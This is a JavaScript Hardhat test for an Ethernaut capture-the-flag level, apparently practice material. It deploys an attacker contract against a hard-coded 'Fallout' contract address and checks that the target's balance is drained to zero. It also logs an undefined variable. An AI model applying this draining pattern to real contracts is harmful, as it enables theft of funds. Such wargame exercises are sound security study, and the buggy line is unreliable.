const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallback Exploit using EOA", function () {
  let attacker, attackerContract, falloutContract, balance, contractAddress;
  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639";
    // Deploy my own attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);

    await attackerContract.deployed();

    // insert contract address of ethernaut challenge
    falloutContract = await ethers.getContractAt("Fallout", contractAddress);

    console.log("the fallback contract is this", fallbackContract);
  });

  it("perform exploit", async function () {
    // Attack flow
    let txAttack = await attackerContract.attack({
      value: ethers.utils.parseEther(".0001"),
    });

    // wait for attack to complete
    let attackReciept = await txAttack.wait();
    console.log("The receipt looks like this", attackReciept);

    balance = await ethers.provider.getBalance(contractAddress);
  });

  after("confirm exploit", async function () {
    // check if the balance is 0
    expect(balance).to.be.eq("0");
  });
});
